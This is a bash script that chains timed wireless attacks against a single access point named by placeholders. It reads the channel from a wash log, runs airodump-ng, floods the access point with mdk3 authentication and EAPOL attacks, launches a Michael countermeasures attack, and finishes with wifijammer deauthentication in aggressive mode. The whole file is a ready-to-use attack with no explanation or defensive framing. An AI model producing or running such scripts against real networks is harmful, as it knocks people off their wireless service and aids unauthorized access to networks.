#!/bin/bash

timeout 32m xterm -geometry '65x25+0+0' -e 'airodump-ng -c $(grep "<BSSID>" /root/wash-log.txt | awk "{print \$2}") --bssid <BSSID> <iface>' | timeout 34m xterm -geometry '65x25+403+0' -e 'sleep 10m && mdk3 <iface> a -a <BSSID>' | timeout 33m xterm -geometry '65x25+806+0' -e 'sleep 10m 40s && mdk3 <iface> x 0 -t <BSSID> -n "<ESSID>" -s 200' | timeout 31m xterm -geometry '65x25+0+399' -e 'sleep 25m && echo "Michael attack begining !!!" && mdk3 <iface> m -t <BSSID>' | timeout 35m xterm -geometry '65x25+403+399' -e 'sleep 26m 2s && python3 /root/wifijammer/wifijammer.py -a <BSSID> -c $(grep "<BSSID>" /root/wash-log.txt | awk "{print \$2}") -i <iface> --aggressive'